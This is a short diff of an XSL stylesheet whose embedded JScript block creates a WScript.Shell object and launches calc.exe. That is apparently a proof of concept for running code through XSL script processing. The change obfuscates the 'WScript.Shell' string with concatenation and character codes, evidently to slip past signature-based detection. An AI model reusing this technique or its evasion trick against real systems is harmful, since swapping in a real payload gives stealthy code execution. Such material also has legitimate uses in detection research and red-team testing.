@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
 	<ms:script implements-prefix="user" language="JScript">
 	<![CDATA[
-	var r = new ActiveXObject("WScript."+"Shell").Run("calc.e" + "xe");
+	var r = new ActiveXObject("W" + "Scrip" + "t." + String.fromCharCode(83, 104, 101, 108, 108)).Run("calc.e" + "xe");
 	]]> </ms:script>
 </stylesheet>
